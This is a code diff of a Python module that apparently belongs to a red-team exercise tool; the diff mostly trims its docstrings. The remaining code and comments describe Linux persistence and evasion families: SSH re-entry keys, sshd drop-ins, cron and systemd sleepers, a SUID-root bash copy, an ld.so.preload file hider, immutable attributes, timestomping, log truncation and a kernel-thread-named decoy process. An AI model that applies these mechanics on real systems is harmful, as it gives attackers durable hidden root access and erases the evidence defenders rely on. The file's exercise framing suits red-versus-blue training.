@@ -1,63 +1,4 @@
-"""persist_linux — the Linux half of `persist`: every family, the exact commands.
-
-`persist.py` owns the family choice, the naming draw, the bookkeeping and the
-restore plumbing. This module owns ONE thing: the mechanism per family. The
-contract it satisfies is `apply(ctx, ip, family, names) -> Result` plus a
-`FAMILIES` table of family -> handler, and a handler's job is small and strict:
-
-* draw nothing. Every path, unit, account and marker comes out of `names`
-  (drawn by `artifactnames.linux_names`), `NEEDS` asserts the family has the
-  names it needs, and a handler that invents a literal path is the IOC factory
-  this rewrite exists to remove.
-* one round trip per family (two when the plant needs a binary upload), and the
-  script reports present / created / repaired / failed itself, so the outcome
-  is read off the box instead of assumed from rc.
-* idempotent by construction. Every write is guarded by the same predicate that
-  tells us whether the artifact is already there (`grep -qF || echo`, `[ -f ]`,
-  `test -u`), and the handler's presence branch means a second run of the same
-  family is `ok=True` with **nothing written and nothing recorded**. That is the
-  re-plant path after blue cleans, and the single most important behaviour in
-  this file: re-assertion may never duplicate a key line, a crontab entry, a
-  unit file or a world artifact.
-* never delete. A broken artifact is *moved* to `<path>.tlaloc-bak` before it is
-  rewritten ("repaired"), a refused preload is parked rather than removed, and a
-  log wipe keeps a copy of what it wiped. `rm` appears nowhere in a plant path;
-  only in an undo recipe, where the organizer asked for it.
-* nothing escapes. A transport error, a non-zero rc or a missing marker is
-  `Result(False, ...)` with the reason; the family fails alone and the cycle
-  continues. Only the shape of the call (unknown family, missing names) is
-  rejected up front by `apply()`, and never as an exception.
-
-Families (the order `persist.auto_order` walks them):
-
-  systemd_unit  a sleeper unit in /etc/systemd/system, enabled --now
-  profile       an /etc/profile.d snippet that re-adds the re-entry key on login
-  sshd_dropin   an sshd_config.d drop-in + a red-only second AuthorizedKeysFile
-  cron          /etc/cron.d entry that re-touches a marker
-  cron_reaper   /etc/cron.d entry that re-stops a service we already took down
-  timer         unit+timer pair that re-asserts the login hook every 5 min
-  user_cron     a line in the foothold user's own spool + linger
-  keys          the re-entry public key in authorized_keys (user, and root)
-  suid          a SUID-root bash clone at a boring path
-  preload       the ld.so.preload hider: red's paths vanish from readdir
-  immu          chattr +i over red's planted files
-  timestomp     mtimes matched to a system reference file
-  logwipe       journal vacuum + auth/syslog rotation on a cron
-  decoy         the procfilter hunt-bait: a hidden sleeper unhide(1) can flag
-
-Three deliberate deviations from the earlier agent's mechanics, each one an
-audit finding:
-
-1. `logwipe` COPIES auth.log/syslog into a drawn backup directory before the
-   truncation (the earlier agent truncated in place — a delete of evidence no
-   restore table can undo).
-2. A preload that fails its `LD_PRELOAD=<so> /bin/true` load test parks the .so
-   and its conf as `.tlaloc-bak` instead of removing them, and reports the plant
-   as `ok=False, installed=True` so the box's footprint still reaches the
-   artifact and restore tables.
-3. `chattr +i` never touches `/etc/ld.so.preload`: making the one file blue has
-   to edit immutable would break the box's own repair path.
-"""
+"""persist_linux — the Linux half of `persist`: every family, the exact commands."""
 
 import base64
 import json
@@ -68,27 +9,22 @@ import shlex
 from .artifactnames import title
 from .base import Result, can_root, root_cmd
 
-# The marker every plant script ends with, so a handler reads its outcome off
-# the box (state=...) instead of assuming it from rc.
+# Plant scripts all end with the marker; handlers read state= off the box, not from rc.
 MARKER = "TLALOC_PLANT"
 PROBE = "TLALOC_PROBE"
 
-# Where a broken/refused artifact is parked: moved, never deleted. Same
-# vocabulary as takedown's `.tlaloc-off` / `.tlaloc-bak`.
+# Broken/refused artifacts are parked here: moved, never deleted.
 BAK = ".tlaloc-bak"
 
 LD_PRELOAD = "/etc/ld.so.preload"
 
-# Absolute paths worth hiding/hardening, harvested from this box's artifacts.
-# ld.so.preload is excluded on purpose (see the module docstring).
+# ld.so.preload is excluded: chattr +i over the one file blue must edit would break the box repair path.
 _HARVEST_EXCLUDE = ("/dev/", "/proc/", "/sys/", LD_PRELOAD)
 _HARVEST_RE = r"(/[\w./+@-]{3,})"
 _UNIT_RE = r"\(([\w.@-]+\.service)\)"
 
-# The decoy's argv camouflage: real kernel-thread names, deliberately NOT drawn
-# from the pool. A themed name here is the tell unhide's neighbour lookup is
-# looking for; the whole point is to be indistinguishable from the kernel's own
-# workers.
+# Decoy argv camouflage: real kernel-thread names, deliberately NOT pool-drawn —
+# a themed name is exactly the tell unhide's neighbour lookup hunts for.
 KTHREADS = ("[kworker/u9:2]", "[kworker/3:1]", "[ksoftirqd/2]", "[migration/0]")
 
 
@@ -101,14 +37,11 @@ def _q(text):
 
 
 def _staging_for(path):
-    """`/usr/lib/.<label>/lib<label>.so` -> `/tmp/.<label>-upload` (the earlier
-    agent's `/tmp/.<name>-upload` staging idiom, derived from the drawn label)."""
     label = os.path.basename(os.path.dirname(path)).lstrip(".")
     return f"/tmp/.{label or os.path.basename(path).lstrip('.')}-upload"
 
 
 def _root_ssh(ctx, ip, fh, script, timeout=60):
-    """The one transport idiom this module uses (root-cmd-wrapped, key-aware)."""
     return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                        root_cmd(script, fh), timeout=timeout,
                        key_path=fh.get("key_path"))
@@ -145,14 +78,9 @@ def _run_marked(ctx, ip, fh, script, timeout=60, token=MARKER):
 
 
 def _wrap(family, guard, create, owned=None):
-    """The plant script every file-owning family shares.
-
-    `guard` is the standing check (the predicate the artifact records as its
-    `check_cmd`), so a box that already has the artifact takes the `present`
-    branch and nothing is written. `owned`, when given, is a path this family
-    owns exclusively: if it exists while the guard fails, the artifact is
-    broken — move it aside and recreate.
-    """
+    """The shared plant script: the guard is the standing check, so an existing artifact
+    takes the present branch and writes nothing; `owned` existing with a failed guard
+    means broken — move aside and recreate."""
     lines = [f"if {guard}; then st=present; else", "  st=created"]
     if owned:
         lines.append(f"  [ -e {owned} ] && {{ mv -f {owned} {owned}{BAK} "
@@ -175,13 +103,7 @@ def _probe(ctx, ip, fh, guard, timeout=45):
 
 
 def _present(family, ip):
-    """Second run of a standing family: success, and nothing to record.
-
-    No artifact and no restore recipe are emitted because nothing on the box
-    changed — a duplicate artifact row is the flood persist.py's anti-flood rule
-    exists to prevent, and the organizer's table already carries this plant's
-    undo.
-    """
+    """Standing family again: ok, and no artifact/restore rows because nothing changed."""
     return Result(True, f"{family}: already standing on {ip} — re-asserted, "
                         "nothing rewritten", data={"state": "present"},
                   installed=False)
@@ -199,12 +121,9 @@ def _failed(family, state, ip):
                          f"(state={state}) — nothing to record")
 
 
-# -- shared mechanics ---------------------------------------------------------
 
 def artifact_paths(world, ip):
-    """Absolute paths worth hiding/hardening, harvested from this box's
-    artifacts. The earlier agent regexed the artifact detail; tlaloc also reads
-    the recorded `paths`, which is the record persist.py actually wrote."""
+    """Absolute paths worth hiding/hardening, harvested from this box's artifacts."""
     paths = set()
     for artifact in world.artifacts(ip):
         detail = artifact.get("detail") or ""
@@ -218,15 +137,9 @@ def artifact_paths(world, ip):
 
 
 def reentry_pubkey(ctx, comment):
-    """(key line, problem) — the re-entry key the earlier agent kept at
-    `<state_dir>/red_key`.
-
-    Generated once per install and reused: `exec/ssh.py` already falls back to
-    this private key when a password path is closed, so the plant and the
-    transport have to agree on one file. The comment is this family's drawn
-    label — a fixed comment survives every clean, because blue greps it once and
-    has a list of every key we own (the rebuild's audit).
-    """
+    """The re-entry key: generated once, reused — exec/ssh.py falls back to this private
+    key, so plant and transport must agree on one file. The comment is the family's drawn
+    label: a fixed comment is a grep target blue keeps."""
     from pathlib import Path
 
     state_dir = Path(ctx.cfg["run"]["state_dir"])
@@ -265,15 +178,9 @@ def preload_install(ctx, ip, fh, so, conf=None, body="", staging=None,
                     post_enabled=(), timeout=90):
     """ONE /etc/ld.so.preload installer for every family that writes the file.
 
-    `LD_PRELOAD=<so> /bin/true` is a PRECONDITION of this function, not a
-    postcheck: a bad line in /etc/ld.so.preload breaks every binary on the box,
-    and the cleanup script cannot even run to unfix itself (the earlier agent
-    shipped two writers, one of which forgot this — audit finding #4). A refusal
-    parks the .so and conf as `.tlaloc-bak`; nothing is ever removed.
-
-    `post_enabled` runs only on the enabled path (the harvester families use it
-    for the work that must not happen behind a refused filter).
-    """
+    LD_PRELOAD=<so> /bin/true is a PRECONDITION, not a postcheck: a bad line breaks every
+    binary on the box and the cleanup cannot even run. A refusal parks the .so and conf
+    as .tlaloc-bak; nothing is ever removed. post_enabled runs only on the enabled path."""
     lines = [
         "set -u",
         "st=created",
@@ -307,19 +214,10 @@ def preload_install(ctx, ip, fh, so, conf=None, body="", staging=None,
     return _run_marked(ctx, ip, fh, "\n".join(lines), timeout=timeout)
 
 
-# -- the families -------------------------------------------------------------
-# Each handler: (ctx, ip, fh, names) -> Result. The command text is the earlier
-# agent's, with every literal replaced by a drawn name and every write behind its
-# own idempotence guard.
 
 def _systemd_unit(ctx, ip, fh, names):
-    """The earlier agent's `_systemd`: a sleeper unit, enabled --now, that
-    survives a reboot.
-
-    Present = the unit file is there AND enabled (the artifact's own
-    `check_cmd`), so a unit blue disabled or a file blue emptied is repaired by
-    rewriting it — after the old bytes are moved to `.tlaloc-bak`.
-    """
+    """Sleeper unit, enabled --now. Present = file AND enabled, so a disabled or emptied
+    unit is repaired after the old bytes move to .tlaloc-bak."""
     unit = _name(names, "unit")
     desc = _name(names, "unit_desc") or f"{title(unit.removesuffix('.service'))} Service"
     path = f"/etc/systemd/system/{unit}"
@@ -354,9 +252,8 @@ def _systemd_unit(ctx, ip, fh, names):
 
 
 def _profile(ctx, ip, fh, names):
-    """The earlier agent's `_profiled`: an /etc/profile.d snippet that re-adds
-    the re-entry key on every interactive login, so a clean that misses the
-    profile file silently regrows access."""
+    """profile.d snippet re-adding the re-entry key on every interactive login: a clean
+    that misses the file silently regrows access."""
     path = _name(names, "profile")
     comment = _name(names, "key_comment")
     pub, problem = reentry_pubkey(ctx, comment)
@@ -389,8 +286,8 @@ def _profile(ctx, ip, fh, names):
 
 
 def _sshd_dropin(ctx, ip, fh, names):
-    """The earlier agent's `_sshd_dropin`: a second, red-controlled
-    AuthorizedKeysFile — removing ~/.ssh/authorized_keys does not evict us."""
+    """A second, red-controlled AuthorizedKeysFile: removing ~/.ssh/authorized_keys
+    does not evict us."""
     dropin = _name(names, "sshd_dropin")
     keydir = _name(names, "keys_dir")
     user = fh["user"]
@@ -428,8 +325,7 @@ def _sshd_dropin(ctx, ip, fh, names):
 
 
 def _cron(ctx, ip, fh, names):
-    """The earlier agent's `_cron`: a /etc/cron.d entry that re-touches a marker
-    every 10 min — a heartbeat blue can find and hunt."""
+    """/etc/cron.d entry re-touching a marker every 10 min — a heartbeat blue can hunt."""
     path = _name(names, "cron")
     marker = _name(names, "cron_marker")
     line = f'*/10 * * * * root /bin/sh -c "touch {marker}"'
@@ -450,15 +346,9 @@ def _cron(ctx, ip, fh, names):
 
 
 def _cron_reaper(ctx, ip, fh, names):
-    """The earlier agent's `_rekill`: a cron that re-stops a service we already
-    took down every 5 min — the direct counter to a blue restore.
-
-    The earlier agent required the caller to name the unit. tlaloc has one source
-    of truth for "which unit did we take down on this box": the impact ledger
-    (takedown records the RESOLVED unit, so `roundcube` lands as `apache2`). With
-    no recorded impact there is nothing to reap — and stopping a service we never
-    took down would be an unlogged takedown, so that is an honest ok=False.
-    """
+    """Cron re-stopping a service we already took down — the counter to a blue restore.
+    The impact ledger is the only source for "which unit"; with no recorded impact the
+    reaper refuses (silently stopping a never-broken service would be an unlogged takedown)."""
     if not (ctx.cfg.get("effects") or {}).get("rekill_cron", True):
         return Result(False, "cron_reaper: the re-kill cron is off "
                              "(effects.rekill_cron)")
@@ -492,9 +382,8 @@ def _cron_reaper(ctx, ip, fh, names):
 
 
 def _timer(ctx, ip, fh, names):
-    """The earlier agent's `_timer`: the timer twin of the reaper cron — a
-    oneshot unit that re-asserts the login hook every 5 min, so deleting the cron
-    file is not enough."""
+    """Timer twin of the reaper: re-asserts the login hook every 5 min, so deleting the
+    cron file is not enough."""
     timer = _name(names, "timer")
     svc_path = f"/etc/systemd/system/{_name(names, 'timer_unit')}"
     tmr_path = f"/etc/systemd/system/{timer}"
@@ -549,14 +438,9 @@ def _timer(ctx, ip, fh, names):
 
 
 def _user_cron(ctx, ip, fh, names):
-    """The earlier agent's `_user_cron`: a line in the foothold user's own spool
-    plus linger — a periodic task that never touches /etc/cron.d.
-
-    The earlier agent appended unconditionally (`crontab -l; echo line | crontab
-    -`), which duplicated the line on every re-plant. Here the append sits behind
-    the same `grep -qF` guard the standing check uses, so re-assertion is a
-    no-op.
-    """
+    """A line in the foothold user's own spool plus linger — never touches /etc/cron.d.
+    The append sits behind the same grep guard the standing check uses, so re-assertion
+    is a no-op (an unguarded append duplicated the line every re-plant)."""
     user = fh["user"]
     if user == "root":
         return Result(False, "user_cron: the foothold is root — the /etc/cron.d "
@@ -586,8 +470,7 @@ def _user_cron(ctx, ip, fh, names):
 
 
 def _keys(ctx, ip, fh, names):
-    """The earlier agent's `_sshkey`: the re-entry key in authorized_keys for the
-    foothold user and for root — re-entry that survives a password rotation."""
+    """Re-entry key in authorized_keys for the foothold user and root: survives a password rotation."""
     comment = _name(names, "key_comment")
     pub, problem = reentry_pubkey(ctx, comment)
     if pub is None:
@@ -621,8 +504,7 @@ def _keys(ctx, ip, fh, names):
 
 
 def _suid(ctx, ip, fh, names):
-    """The earlier agent's `_suid`: a SUID-root copy of bash at a boring path — a
-    re-entry root path that does not depend on any credential blue can rotate."""
+    """SUID-root bash clone at a boring path: root re-entry independent of any credential blue can rotate."""
     dest = _name(names, "suid")
     guard = f"test -u {dest}"
     create = (f"(cp -f /bin/bash {dest} 2>/dev/null || cp -f /usr/bin/bash "
@@ -642,13 +524,8 @@ def _suid(ctx, ip, fh, names):
 
 
 def _preload(ctx, ip, fh, names):
-    """The earlier agent's `evasion_linux._preload`: the ld.so.preload hider —
-    red's own paths disappear from a naive readdir() listing.
-
-    The hider .so must be staged first (it is built at comp-prep, never on the
-    box mid-event) and the hidden names are this box's artifacts, because the
-    .so filters listings by name.
-    """
+    """ld.so.preload hider: red's paths vanish from a naive readdir. The .so is built at
+    comp-prep and staged (never mid-event); hidden names are this box's artifacts."""
     so_src = str((ctx.cfg.get("evasion") or {}).get("preload_so") or "")
     if not so_src or not os.path.exists(so_src):
         return Result(False, "preload: the hider .so is not staged — build it "
@@ -701,15 +578,9 @@ def _preload(ctx, ip, fh, names):
 
 
 def _immu(ctx, ip, fh, names):
-    """The earlier agent's `evasion_linux._immu`: chattr +i over red's planted
-    files, so a plain `rm` fails until blue notices the attribute and clears it
-    first.
-
-    Read off the box per path: newly-immutable counts as created, all-already
-    counts as a no-op re-assertion, and every refusal is a failure (a family
-    that claims to have hardened nothing is the kind of lie the ledger cannot
-    afford).
-    """
+    """chattr +i over red's planted files: a plain rm fails until blue clears the attribute.
+    Outcome read off the box per path; every refusal is a failure — a family that claims
+    to have hardened nothing is a ledger lie."""
     paths = artifact_paths(ctx.world, ip)
     if not paths:
         return Result(False, "immu: nothing planted on this box to make "
@@ -746,13 +617,8 @@ def _immu(ctx, ip, fh, names):
 
 
 def _timestomp(ctx, ip, fh, names):
-    """The earlier agent's `evasion_linux._stomp`: mtimes matched to
-    /etc/hostname, so a "files modified in the last hour" sweep comes back
-    empty.
-
-    The original mtimes are read (and printed) before the stomp, so the undo is
-    a real `touch -d @<epoch>` per path instead of an apology.
-    """
+    """mtimes matched to /etc/hostname so "modified recently" sweeps miss. Originals are
+    printed before the stomp so the undo is a real touch -d per path."""
     paths = artifact_paths(ctx.world, ip)
     if not paths:
         return Result(False, "timestomp: nothing planted on this box to "
@@ -791,15 +657,8 @@ def _timestomp(ctx, ip, fh, names):
 
 
 def _logwipe(ctx, ip, fh, names):
-    """The earlier agent's `evasion_linux._logs`: journal vacuum + auth/syslog
-    truncation on a cron — red's login trail thins while blue hunts.
-
-    tlaloc rotates instead of wiping: the cron calls a drawn helper script which
-    COPIES auth.log/syslog into a drawn directory and then truncates the live
-    files. The live trail thins (the point) and the content is still on the box
-    for the organizer's restore table (the rebuild's "never delete" audit
-    finding).
-    """
+    """Journal vacuum + auth/syslog on a cron — rotated, never wiped: the helper COPIES
+    the logs into a drawn directory before truncating (never-delete audit rule)."""
     cron = _name(names, "log_cleanup")
     helper = f"{_name(names, 'cron_marker')}.sh"
     qdir = f"{_name(names, 'cron_marker')}.bak"
@@ -840,9 +699,7 @@ def _logwipe(ctx, ip, fh, names):
 
 
 def procfilter_so(ctx):
-    """The earlier agent's `proc_hide._staged_so`: a built procfilter.so,
-    compiled once from source if it is not staged (red01 has cc — the beacon
-    build needed it too)."""
+    """A built procfilter.so, compiled once from source if not staged (red01 has cc)."""
     directory = str((ctx.cfg.get("procfilter") or {}).get("install_dir") or "") \
         or "/opt/tlaloc/vendor/procfilter"
     if not os.path.isdir(directory):
@@ -866,20 +723,10 @@ def procfilter_so(ctx):
 
 
 def _decoy(ctx, ip, fh, names):
-    """The procfilter hunt-bait (the earlier agent's `proc_hide`): an
-    /etc/ld.so.preload readdir filter plus a decoy sleeper whose argv is smeared
-    to a kernel-thread name.
-
-    Invisible to ps/top/ls and visible to unhide's syscall brute-force — the
-    mismatch is the hunt blue is supposed to find. The artifact's `check_cmd`
-    pins standing to alive AND still hidden, so a reboot or a blue
-    preload-strip flips it dead for the re-plant rung. One per box: the state
-    file records pid/lib/dir because the filter hides all three from a listing.
-
-    The preload line goes in through the shared `preload_install`, so this
-    family cannot skip the `LD_PRELOAD=/bin/true` load test that its own earlier
-    version (and the rebuild's audit finding #4) is about.
-    """
+    """procfilter hunt-bait: a readdir filter plus a sleeper whose argv is smeared to a
+    kernel-thread name. Invisible to ps/top/ls, visible to unhide's syscall brute-force —
+    the mismatch is the bait. check_cmd pins standing to alive AND hidden; the preload
+    line goes through the shared preload_install, so the load test cannot be skipped."""
     if not (ctx.cfg.get("effects") or {}).get("decoy"):
         return Result(False, "decoy: the procfilter hunt-bait is off by default "
                              "(set effects.decoy=true to enable the optional "
@@ -959,8 +806,7 @@ def _decoy(ctx, ip, fh, names):
                       data={"state": "hidden", "pid": pid, "kthread": kthread},
                       artifacts=[artifact], restore=restore)
     if state_name == "miss":
-        # The files are on the box and the filter is enabled, but the decoy is
-        # not hidden: the box changed, so record it — and report the failure.
+        # filter enabled but the decoy is not hidden: record the footprint, report failure
         return Result(False, f"decoy: the plant on {ip} did not hold (the decoy "
                              "is not alive or still visible to a listing) — the "
                              "files are recorded for cleanup",
@@ -999,9 +845,7 @@ FAMILIES = {
     "decoy": _decoy,
 }
 
-# The drawn names each family cannot work without. persist.py always passes the
-# full set; this is the guard against a caller passing half a name set (which
-# would otherwise plant a broken path).
+# The drawn names each family cannot work without (guards half-passed name sets).
 NEEDS = {
     "systemd_unit": ("unit", "unit_desc"),
     "profile": ("profile", "key_comment"),
@@ -1022,12 +866,7 @@ NEEDS = {
 
 
 def apply(ctx, ip, family, names):
-    """Install one family and report exactly what was planted.
-
-    Returns a Result for every outcome: an unknown family, an incomplete name
-    set, no root path, a transport blow-up and a box that refused the write are
-    all ok=False with the reason. Nothing raises.
-    """
+    """Install one family; every failure mode is ok=False with a reason. Nothing raises."""
     handler = FAMILIES.get(family)
     if handler is None:
         return Result(False, f"persist: unknown linux family {family!r} "
